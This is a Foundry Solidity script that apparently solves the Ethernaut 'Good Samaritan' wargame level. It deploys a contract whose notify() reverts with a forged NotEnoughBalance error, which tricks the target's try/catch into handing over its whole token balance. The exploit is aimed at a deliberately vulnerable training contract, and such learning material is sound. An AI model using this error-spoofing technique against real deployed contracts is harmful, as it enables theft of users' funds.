// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {GoodSamaritan, INotifyable} from "../../src/27/GoodSamaritan.sol";
import {GoodSamaritanFactory} from "src/27/GoodSamaritanFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract GoodSamaritanExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL27_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new GoodSamaritanFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Create a contract that reverts with the error = NotEnoughBalance() when it calls notify function.
        // What's important to note is that when a try/catch statement catches an exception, all state changes made by the try block are reverted and the context will be preserved as it was before the call.
        Exploit hack = new Exploit(GoodSamaritan(instance));

        hack.emptyGoodSamaritan();

        // DONE !


        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    error NotEnoughBalance();

    GoodSamaritan goodSamaritan;
    uint256 counter;

    constructor(GoodSamaritan _goodSamaritan) {
        goodSamaritan = _goodSamaritan;
    }

    function notify(uint256 amount) external {
        // Depending on the amount revert or not
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function emptyGoodSamaritan() external {
        goodSamaritan.requestDonation();
    }
}